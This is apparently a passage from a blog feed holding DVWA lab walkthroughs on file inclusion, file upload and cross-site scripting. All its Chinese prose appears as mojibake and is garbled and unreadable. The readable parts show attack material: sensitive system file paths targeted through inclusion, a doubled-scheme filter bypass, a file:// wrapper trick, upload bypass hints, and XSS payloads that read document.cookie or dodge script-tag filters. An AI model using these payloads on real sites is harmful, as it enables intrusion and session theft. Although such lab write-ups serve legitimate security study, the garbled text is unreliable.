href="#æ–‡ä»¶åŒ…å«å¸¸ç”¨å‡½æ•°">ğŸ­</a>æ–‡ä»¶åŒ…å«å¸¸ç”¨å‡½æ•°</h2><ul><li>includeã€‚åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ï¼Œincludeåœ¨å‡ºé”™æ—¶äº§ç”Ÿè­¦å‘Š(E_WARNING)ï¼Œè„šæœ¬ä¼šç»§ç»­è¿è¡Œã€‚</li><li>include_onceã€‚åœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚è¯¥å‡½æ•°å’Œincludeå‡½æ•°ç±»ä¼¼ï¼Œä½†ä½¿ç”¨è¯¥å‡½æ•°æ—¶ï¼ŒPHPä¼šæ£€æŸ¥æŒ‡å®šæ–‡ä»¶æ˜¯å¦å·²ç»è¢«åŒ…å«è¿‡ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«ã€‚</li><li>requireã€‚åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚requireåœ¨å‡ºé”™æ—¶äº§ç”ŸE_COMPILE_ERRORçº§åˆ«çš„é”™è¯¯ï¼Œå¯¼è‡´è„šæœ¬ä¸­æ­¢è¿è¡Œã€‚</li><li>require_onceã€‚å®ƒå’Œrequireå‡½æ•°ç±»ä¼¼ï¼Œä½†ä½¿ç”¨è¯¥å‡½æ•°æ—¶ï¼ŒPHPä¼šæ£€æŸ¥æŒ‡å®šæ–‡ä»¶æ˜¯å¦å·²ç»è¢«åŒ…å«è¿‡ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«ã€‚</li></ul><h2 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a class="header-anchor" href="#æœ¬åœ°æ–‡ä»¶åŒ…å«">ğŸ­</a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h2><h3 id="æ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«"><a class="header-anchor" href="#æ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«">ğŸ­</a>æ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«</h3><p>ä»£ç ä¸­æ²¡æœ‰ä¸ºåŒ…å«æ–‡ä»¶æŒ‡å®šç‰¹å®šçš„å‰ç¼€æˆ–è€….phpã€htmlç­‰æ‰©å±•åï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è¯»å–æ“ä½œç³»ç»Ÿä¸­çš„å…¶ä»–æ–‡ä»¶ï¼Œè·å–æ•æ„Ÿä¿¡æ¯ï¼Œæˆ–è€…æ‰§è¡Œå…¶ä»–æ–‡ä»¶ä¸­çš„ä»£ç ã€‚</p><h3 id="æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«"><a class="header-anchor" href="#æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«">ğŸ­</a>æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«</h3><p>ä»£ç ä¸­ä¸ºåŒ…å«æ–‡ä»¶æŒ‡å®šäº†ç‰¹å®šçš„å‰ç¼€æˆ–è€….phpã€.htmlç­‰æ‰©å±•åï¼Œæ”»å‡»è€…éœ€è¦ç»•è¿‡å‰ç¼€æˆ–è€…æ‰©å±•åè¿‡æ»¤ï¼Œæ‰èƒ½åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è¯»å–æ“ä½œç³»ç»Ÿä¸­çš„å…¶ä»–æ–‡ä»¶ï¼Œè·å–æ•æ„Ÿä¿¡æ¯ã€‚å¸¸è§çš„æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«è¿‡æ»¤ç»•è¿‡çš„æ–¹å¼ä¸»è¦æœ‰%00æˆªæ–­æ–‡ä»¶åŒ…å«ã€è·¯å¾„é•¿åº¦æˆªæ–­æ–‡ä»¶åŒ…å«ã€ç‚¹å·æˆªæ–­æ–‡ä»¶åŒ…å«è¿™3ç§ã€‚</p><h3 id="å¸¸è§çš„æ•æ„Ÿä¿¡æ¯è·¯å¾„"><a class="header-anchor" href="#å¸¸è§çš„æ•æ„Ÿä¿¡æ¯è·¯å¾„">ğŸ­</a>å¸¸è§çš„æ•æ„Ÿä¿¡æ¯è·¯å¾„</h3><p>åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥è·å–ç³»ç»Ÿæœ¬åœ°çš„å…¶ä»–æ–‡ä»¶çš„å†…å®¹ã€‚<br>Windowsç³»ç»Ÿå¸¸è§æ•æ„Ÿæ–‡ä»¶å¦‚ä¸‹ï¼š</p><pre><code class="hljs latex">c:<span class="hljs-tag">\<span class="hljs-name">boot</span></span>.iniç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯c:<span class="hljs-tag">\<span class="hljs-name">xxx</span></span><span class="hljs-tag">\<span class="hljs-name">php</span></span>.ini PHPé…ç½®ä¿¡æ¯ã€‚c:<span class="hljs-tag">\<span class="hljs-name">xxx</span></span><span class="hljs-tag">\<span class="hljs-name">my</span></span>.ini MySQLé…ç½®ä¿¡æ¯ã€‚c: <span class="hljs-tag">\<span class="hljs-name">xxx</span></span><span class="hljs-tag">\<span class="hljs-name">httpd</span></span>.conf Apacheé…ç½®ä¿¡æ¯ã€‚</code></pre><p>linux:</p><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>passwd Linuxç³»ç»Ÿè´¦å·ä¿¡æ¯ã€‚<span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf Apacheé…ç½®ä¿¡æ¯ã€‚<span class="hljs-regexp">/etc/my</span>.conf MySQLé…ç½®ä¿¡æ¯ã€‚<span class="hljs-regexp">/usr/</span>etc/php.ini PHPé…ç½®ä¿¡æ¯ã€‚</code></pre><h2 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a class="header-anchor" href="#è¿œç¨‹æ–‡ä»¶åŒ…å«">ğŸ­</a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h2><h3 id="æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«"><a class="header-anchor" href="#æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«">ğŸ­</a>æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«</h3><p>æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«æ˜¯æŒ‡åŒ…å«æ–‡ä»¶çš„ä½ç½®å¹¶ä¸æ˜¯æœ¬åœ°æœåŠ¡å™¨ï¼Œè€Œæ˜¯é€šè¿‡URL.çš„å½¢å¼åŒ…å«å…¶ä»–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œæ‰§è¡Œæ–‡ä»¶ä¸­çš„æ¶æ„ä»£ç <br>æ¼æ´åˆ©ç”¨æ¡ä»¶ä¸º<code>allow_url_fopen=onå’Œ allow_url_include=on</code></p><h3 id="æœ‰é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«"><a class="header-anchor" href="#æœ‰é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«">ğŸ­</a>æœ‰é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«</h3><p>æœ‰é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«æ˜¯æŒ‡å½“ä»£ç ä¸­å­˜åœ¨ç‰¹å®šçš„å‰ç¼€æˆ–è€…ï¼Œphpï¼Œhtrulç­‰æ‰©å±•åè¿‡æ»¤æ—¶ï¼Œæ”»å‡»è€…éœ€è¦ç»•è¿‡å‰ç¼€æˆ–è€…æ‰©å±•åè¿‡æ»¤ï¼Œæ‰èƒ½æ‰§è¡Œè¿œç¨‹URLä¸­çš„æ¶æ„ä»£ç ã€‚</p><h2 id="low"><a class="header-anchor" href="#low">ğŸ­</a>low</h2><p>é¡µé¢ä¸­æœ‰3ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«ç‚¹å‡»urlä¸­pagçš„å‚æ•°å€¼æ”¹å˜ã€‚</p><h3 id="æœ¬åœ°æ–‡ä»¶åŒ…å«-v2"><a class="header-anchor" href="#æœ¬åœ°æ–‡ä»¶åŒ…å«-v2">ğŸ­</a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h3><p>å…ˆåœ¨å¯æ§å‚æ•°å€¼ä½ç½®è¾“å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶è¿›è¡Œè®¿é—®</p><p><img src="/2021/01/27/dvwa5/1.jpg" alt="1"></p><p>æŠ¥é”™ä¿¡æ¯ä¸­å«ç»å¯¹è·¯å¾„ï¼Œç½‘ç«™æ ¹ç›®å½•ä¸º\dvwa\ ï¼Œinclude.phpåˆ°ç½‘ç«™æ ¹ç›®å½•å…±éš”äº†ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬å¯ä»¥è¿”å›åˆ°æ ¹ç›®å½•å»è®¿é—®ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚PHPç‰ˆæœ¬ä¿¡æ¯</p><p><img src="/2021/01/27/dvwa5/2.jpg" alt="2"></p><h3 id="è¿œç¨‹æ–‡ä»¶åŒ…å«-v2"><a class="header-anchor" href="#è¿œç¨‹æ–‡ä»¶åŒ…å«-v2">ğŸ­</a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h3><h4 id="åŒ…å«æœ¬åœ°æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶"><a class="header-anchor" href="#åŒ…å«æœ¬åœ°æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶">ğŸ­</a>åŒ…å«æœ¬åœ°æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶</h4><p>åœ¨æœ¬åœ°æ ¹ç›®å½•åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶è®¿é—®å¦‚ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;genius&quot;</span> ; <span class="hljs-meta">?&gt;</span></code></pre><p>å‘½åä¸ºjpgæ ¼å¼ï¼ˆå…¶å®ƒæ ¼å¼ä¹Ÿå¯ï¼Œåœ¨HTTPä¸­è‹¥æ–‡ä»¶æœ‰åŒ…å«PHPä»£ç ï¼Œä»£ç éƒ½ä¼šè¢«æ‰§è¡Œ)</p><img src="/2021/01/27/dvwa5/3.jpg" alt="3" style="zoom:67%;"><p>geniusæ”¹æˆå…¶å®ƒæ¶æ„ä»£ç </p><h4 id="åŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶"><a class="header-anchor" href="#åŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶">ğŸ­</a>åŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶</h4><p>å¯ä»¥åŒ…å«Linuxé‡Œçš„æ–‡ä»¶ï¼Œè¿œç¨‹è¿æ¥ï¼ˆä¸å±•ç¤ºè¾½)</p><h2 id="medium"><a class="header-anchor" href="#medium">ğŸ­</a>medium</h2><pre><code class="hljs lasso"><span class="hljs-comment">// Input validation</span>$file = str_replace( <span class="hljs-built_in">array</span>( <span class="hljs-string">&quot;http://&quot;</span>, <span class="hljs-string">&quot;https://&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, $file );$file = str_replace( <span class="hljs-built_in">array</span>( <span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-string">&quot;..\&quot;&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, $file );</code></pre><p>æºç ä¸­å°†è¾“å…¥çš„urlå‚æ•°ä¸­åŒ…å«çš„<code>http://</code>ï¼Œ<code>https:// </code>ï¼Œ<code>. . /</code> ï¼Œ<code>. . \</code>æ›¿æ¢æˆç©ºå­—ç¬¦ã€‚åªè¿‡æ»¤äº†è¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚</p><h3 id="æœ¬åœ°åŒ…å«"><a class="header-anchor" href="#æœ¬åœ°åŒ…å«">ğŸ­</a>æœ¬åœ°åŒ…å«</h3><p>ä¸lowä¸€æ ·</p><h3 id="è¿œç¨‹åŒ…å«"><a class="header-anchor" href="#è¿œç¨‹åŒ…å«">ğŸ­</a>è¿œç¨‹åŒ…å«</h3><p>æ„é€ :<code>httphttp://://127.0.0.1/1.jpg</code></p><p><img src="/2021/01/27/dvwa5/4.jpg" alt="4"></p><h2 id="high"><a class="header-anchor" href="#high">ğŸ­</a>high</h2><pre><code class="hljs gams"><span class="hljs-comment">// Input validation</span><span class="hljs-keyword">if</span>( !fnmatch( <span class="hljs-string">&quot;file*&quot;</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> ) &amp;&amp; <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> != <span class="hljs-string">&quot;include.php&quot;</span> ) &#123;    <span class="hljs-comment">// This isn&#x27;t the page we want!</span>    echo <span class="hljs-string">&quot;ERROR: File not found!&quot;</span>;    exit;</code></pre><p>fnmatch() å‡½æ•°æ ¹æ®æŒ‡å®šçš„æ¨¡å¼æ¥åŒ¹é…æ–‡ä»¶åæˆ–å­—ç¬¦ä¸²ã€‚</p><p>è¯­æ³•</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">fnmatch</span><span class="hljs-params">(pattern,string,flags)</span></span></code></pre><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>pattern</td><td>å¿…éœ€ã€‚è§„å®šè¦æ£€ç´¢çš„æ¨¡å¼ã€‚</td></tr><tr><td>string</td><td>å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„å­—ç¬¦ä¸²æˆ–æ–‡ä»¶ã€‚</td></tr><tr><td>flags</td><td>å¯é€‰ã€‚</td></tr></tbody></table><p>æœ¬å…³ç”¨fnmatchï¼ˆï¼‰æ£€æŸ¥fileã€‚ä»‹ç»ä¸€ä¸ªå°çŸ¥è¯†:</p><p><strong>PHP ä¼ªåè®®</strong></p><p>PHPå¸¦æœ‰å¾ˆå¤šå†…ç½®URL.é£æ ¼çš„å°è£…åè®®ï¼Œå¯ç”¨äº<code>fopenï¼Œcopy,file_existså’Œfilesize</code>ç­‰æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ã€‚é™¤äº†è¿™äº›å†…ç½®å°è£…åè®®ï¼Œè¿˜èƒ½é€šè¿‡stream_wrapper_registeræ³¨å†Œè‡ªé¢˜ä¹‰çš„å°è£…åè®®ã€‚è¿™äº›åè®®éƒ½è¢«ç§°ä¸ºä¼ªåè®®ã€‚<br>å¸¸è§çš„PHPä¼ªåè®®å¦‚ä¸‹ï¼š</p><pre><code class="hljs awk">fileï¼š<span class="hljs-regexp">//</span> è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿhttp:<span class="hljs-regexp">//</span> è®¿é—®HTTP(S)ç½‘å€ftp:<span class="hljs-regexp">//</span> è®¿é—®FTP(S) URLphpï¼š<span class="hljs-regexp">//</span> è®¿é—®å„ä¸ªè¾“å…¥è¾“å‡ºæµzlibï¼š<span class="hljs-regexp">//</span> å¤„ç†å‹ç¼©æµdata:<span class="hljs-regexp">//</span> è¯»å–æ•°æ®globï¼š<span class="hljs-regexp">//</span> æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼phar:<span class="hljs-regexp">//</span> PHPå½’æ¡£ssh2:<span class="hljs-regexp">//</span> Secure Shell <span class="hljs-number">2</span>rarï¼š<span class="hljs-regexp">//</span> RARæ•°æ®å‹ç¼©oggï¼š<span class="hljs-regexp">//</span> å¤„ç†éŸ³é¢‘æµexpectï¼š<span class="hljs-regexp">//</span> å¤„ç†äº¤äº’å¼çš„æµ</code></pre><p>æœ¬å…³æ„é€ ï¼š<code>file://D:/phpstudy_pro/WWW/1.jpg</code>å³å¯~</p><h2 id="impossible"><a class="header-anchor" href="#impossible">ğŸ­</a>impossible</h2><p><img src="/2021/01/27/dvwa5/5.jpg" alt="5"></p><h1>File Upload</h1><p>åœ¨upload-labsé‡Œè¯¦ç»†ä»‹ç»è¿‡äº†ï¼Œè¿™é‡Œç®€å•è®²ä¸€ä¸‹</p><h2 id="low-v2"><a class="header-anchor" href="#low-v2">ğŸ­</a>low</h2><p>basename() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†</p><p>è¯­æ³•</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">basename</span><span class="hljs-params">(path,suffix)</span></span></code></pre><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>path</td><td>å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„è·¯å¾„ã€‚</td></tr><tr><td>suffix</td><td>å¯é€‰ã€‚è§„å®šæ–‡ä»¶æ‰©å±•åã€‚å¦‚æœæ–‡ä»¶æœ‰ suffixï¼Œåˆ™ä¸ä¼šè¾“å‡ºè¿™ä¸ªæ‰©å±•å</td></tr></tbody></table><p>æ²¡ä»€ä¹ˆè¿‡æ»¤ï¼Œä¸èµ˜è¿°</p><h2 id="medium-v2"><a class="header-anchor" href="#medium-v2">ğŸ­</a>medium</h2><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">( ( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/jpeg&quot;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/png&quot;</span> )</span></span> &amp;&amp;    ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) )</code></pre><p>é™åˆ¶æ–‡ä»¶å¤§å°å’Œç±»å‹ï¼ŒæŠ“åŒ…ä¿®æ”¹æˆ–è€…00æˆªæ–­ï¼ˆ<strong>æ³¨æ„PHPç‰ˆæœ¬</strong>ï¼‰éƒ½å¯ä»¥</p><h2 id="high-v2"><a class="header-anchor" href="#high-v2">ğŸ­</a>high</h2><p>å¤šäº†ä¸€å¥ï¼š</p><pre><code class="hljs perl">$uploaded_ext  = <span class="hljs-keyword">substr</span>( $uploaded_name, strrpos( $uploaded_name, <span class="hljs-string">&#x27;.&#x27;</span> ) + <span class="hljs-number">1</span>);</code></pre><p>å‡ºç°çš„å‡½æ•°upload-labséƒ½è®²è¿‡äº†ï¼Œæœ¬å…³ç™½åå•ï¼Œæ„é€ å›¾ç‰‡é©¬ï¼Œ00æˆªæ–­éƒ½å¯</p><h2 id="impossible-v2"><a class="header-anchor" href="#impossible-v2">ğŸ­</a>impossible</h2><p><img src="/2021/01/27/dvwa5/6.jpg" alt="6"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||XSS(Reflected&amp;Stored&amp;DOM)</title>
    <link href="/2021/01/27/3/"/>
    <url>/2021/01/27/3/</url>
    
    <content type="html"><![CDATA[<h1>XSSåŸç†</h1><p>XSSæ˜¯è·¨ç«™è„šæœ¬æ”»å‡»(Cross Site Scripting)æ¶æ„æ”»å‡»è€…å¾€Webé¡µé¢é‡Œæ’å…¥æ¶æ„Scriptä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µæ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚XSSçš„å®è´¨å…¶å®æ˜¯HTMLä»£ç ä¸Javscriptä»£ç çš„æ³¨å…¥ã€‚ä½†ç”±äºXSSçš„æ”»å‡»å¯¹è±¡æ˜¯ä¸å®¢æˆ·å¯¹ç­‰çš„Browserç«¯ï¼Œå› æ­¤å¸¸å¸¸ä¸è¢«å¼€å‘è€…æ‰€é‡è§†ã€‚ä½†xssæ¼æ´å±å®³å¾ˆå¤§ï¼Œä¸€æ—¦è¢«æ”»å‡»æˆåŠŸï¼Œç§å¯†ç½‘é¡µï¼Œä¼šè¯ï¼Œcookie(è®¸å¤šç½‘é¡µåœ¨ç™»å½•åæœåŠ¡ç«¯ä¼šè¿”å›ä¸€ä¸ªcookieå€¼ç»™ç”¨æˆ·ç«¯ï¼Œè¿™æ ·ç”¨æˆ·å°±ä¸ç”¨å¤šæ¬¡è¾“å…¥å¯†ç è¿›è¡Œç™»å½•ï¼Œä½†cookieå¦‚æœè¢«çªƒå–ï¼Œæ”»å‡»è€…å°±å¯ä»¥è‚†æ„ç™»å½•ç”¨æˆ·çš„è´¦å·ï¼Œ<strong>http-onlyå¯ç¡®ä¿cookieä¸è¢«ç›—ç”¨</strong>)ç­‰å†…å®¹éƒ½ä¼šè¢«çªƒå–ï¼Œè¿˜å¯èƒ½å¯¼è‡´æµé‡è¢«åŠ«æŒå®ç°æ¶æ„è·³è½¬ï¼ˆæ¯”å¦‚åœ¨ç½‘é¡µä¸­æ’å…¥ä¸€æ®µ<code>&lt;script&gt;window.location.href=&quot;ä»»æ„ç½‘å€&quot;;&lt;/script&gt;</code>å°±å¯ä»¥è·³è½¬åˆ°åˆ«çš„ç½‘å€ï¼‰ã€‚</p><p>ä¸¾ä¸ªæ —å­:</p><p>éšä¾¿å†™ä¸ªç½‘é¡µ</p><pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">&quot;PowderBlue&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>æŸ¥è¯¢<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xss_input&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span></span><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$xss = $_GET[<span class="hljs-string">&#x27;xss_input&#x27;</span>];</span><span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;è¾“å…¥å€¼:&lt;br&gt;&#x27;</span>.$xss;</span><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre><p>æ•ˆæœï¼š</p><img src="/2021/01/27/3/2.jpg" alt="2" style="zoom:67%;"><p>æœ‰ç‚¹ç®€é™‹(htmläº†è§£ä¸å¤š)ï¼Œéšä¾¿è¾“å…¥ä¸€ä¸‹é¡µé¢ä¼šæ­£å¸¸å›æ˜¾</p><p><img src="/2021/01/27/3/3.jpg" alt="3"></p><p>æŸ¥çœ‹é¡µé¢æºç </p><p><img src="/2021/01/27/3/4.jpg" alt="4"></p><p>åŸå°ä¸åŠ¨è¾“å…¥äº†ï¼Œæˆ‘ä»¬æ¢ä¸ªå€¼è¾“å…¥:<code>&lt;script&gt;alert('genius')&lt;/script&gt;</code></p><img src="/2021/01/27/3/5.jpg" alt="5" style="zoom:67%;"><p>è¿™æ¬¡ä¸åƒç¬¬ä¸€æ¬¡é‚£æ ·ï¼Œè€Œæ˜¯æ‰§è¡Œäº†è¾“å…¥çš„ä»£ç ï¼Œå¼¹å‡ºä¸€ä¸ªæ¡†ï¼Œè¿™å°±å­˜åœ¨xssæ¼æ´ã€‚ä½†å¹¶ä¸æ˜¯åªæœ‰scriptæ ‡ç­¾æ‰å¯ä»¥æ’å…¥ä»£ç ï¼ŒHTMLä¸­è¿˜æœ‰<code>onerror,oneclick,onmouseover,Onloadâ€¦â€¦</code>å¤šç§æ–¹å¼ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š</p><pre><code class="hljs awk">onerror<span class="hljs-regexp">/oneclick/</span>onmouseover/Onload=â€œæ‰§è¡Œå†…å®¹â€</code></pre><p>å…¶æ¬¡è¿˜å¯æ’åœ¨<code>&lt;img&gt;,&lt;textarea&gt;â€¦â€¦</code>æ ‡ç­¾é‡Œã€‚</p><p>æ ¹æ®æ¶æ„ä»£ç æ˜¯å¦å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­ï¼ŒXSSå¯ä»¥åˆ†ä¸ºå­˜å‚¨å‹çš„XSSä¸åå°„å‹çš„XSSï¼ŒDOMå‹çš„XSSç”±äºå…¶ç‰¹æ®Šæ€§ï¼Œå¸¸å¸¸è¢«åˆ†ä¸ºç¬¬ä¸‰ç§ã€‚</p><h2 id="åå°„å‹XSS"><a class="header-anchor" href="#åå°„å‹XSS">ğŸ­</a>åå°„å‹XSS</h2><p>åå°„å‹XSSåˆç§°éæŒä¹…å‹XSSï¼Œè¿™ç§æ”»å‡»æ–¹å¼å¾€å¾€å…·æœ‰ä¸€æ¬¡æ€§ã€‚<br>æ”»å‡»æ–¹å¼ï¼šæ”»å‡»è€…é€šè¿‡ç”µå­é‚®ä»¶ç­‰æ–¹å¼å°†åŒ…å«XSSä»£ç çš„æ¶æ„é“¾æ¥å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚å½“ç›®æ ‡ç”¨æˆ·è®¿é—®è¯¥é“¾æ¥æ—¶ï¼ŒæœåŠ¡å™¨æ¥æ”¶è¯¥ç›®æ ‡ç”¨æˆ·çš„è¯·æ±‚å¹¶è¿›è¡Œå¤„ç†ï¼Œç„¶åæœåŠ¡å™¨æŠŠå¸¦æœ‰XSSä»£ç çš„æ•°æ®å‘é€ç»™ç›®æ ‡ç”¨æˆ·çš„æµè§ˆå™¨ï¼Œæµè§ˆå™¨è§£æè¿™æ®µå¸¦æœ‰XSSä»£ç çš„æ¶æ„è„šæœ¬åï¼Œå°±ä¼šè§¦å‘XSSæ¼æ´ã€‚å¸¸å‡ºç°äºé’“é±¼ç½‘ç«™ï¼Œé‚®ç®±ç­‰ã€‚</p><h2 id="low"><a class="header-anchor" href="#low">ğŸ­</a>low</h2><p>æºç ä¸­æœ‰ä¸€ä¸ªæ–°å‡½æ•°ï¼š<code>array_key_exists() </code>:å‡½æ•°æ£€æŸ¥æŸä¸ªæ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„é”®åï¼Œå¦‚æœé”®åå­˜åœ¨åˆ™è¿”å› trueï¼Œå¦‚æœé”®åä¸å­˜åœ¨åˆ™è¿”å› falseã€‚</p><p>æœ¬å…³å¹¶æ— è¿‡æ»¤ã€‚æµ‹è¯•ä¸€ä¸‹ï¼š</p><p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><img src="/2021/01/27/3/6.jpg" alt="6" style="zoom: 80%;"><p>è·å–cookie:</p><p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><img src="/2021/01/27/3/7.jpg" alt="7"></p><p>è¾“å…¥ï¼š</p><img src="/2021/01/27/3/8.jpg" alt="8" style="zoom:80%;"><p>å°±æˆåŠŸè¾½~</p><h2 id="medium"><a class="header-anchor" href="#medium">ğŸ­</a>medium</h2><p>æºç ç”¨<code>str_replace</code>å‡½æ•°å¯¹<code>&lt;script&gt;</code>æ ‡ç­¾è¿›è¡Œæ›¿æ¢ã€‚</p><h3 id="åµŒå¥—ç»•è¿‡"><a class="header-anchor" href="#åµŒå¥—ç»•è¿‡">ğŸ­</a>åµŒå¥—ç»•è¿‡</h3><p>æ„é€ ï¼š<code>&lt;scr&lt;script&gt;ipt&gt;alert(666)&lt;/script&gt;</code></p><img src="/2021/01/27/3/10.jpg" alt="10" style="zoom:50%;"><h3 id="å¤§å°å†™ç»•è¿‡"><a class="header-anchor" href="#å¤§å°å†™ç»•è¿‡">ğŸ­</a>å¤§å°å†™ç»•è¿‡</h3><p><code>&lt;Script&gt;alert(/genius/)&lt;/script&gt;</code></p><img src="/2021/01/27/3/11.jpg" alt="11" style="zoom:80%;"><h3 id="ä½¿ç”¨åˆ«çš„æ ‡ç­¾æ¥ç»•è¿‡"><a class="header-anchor" href="#ä½¿ç”¨åˆ«çš„æ 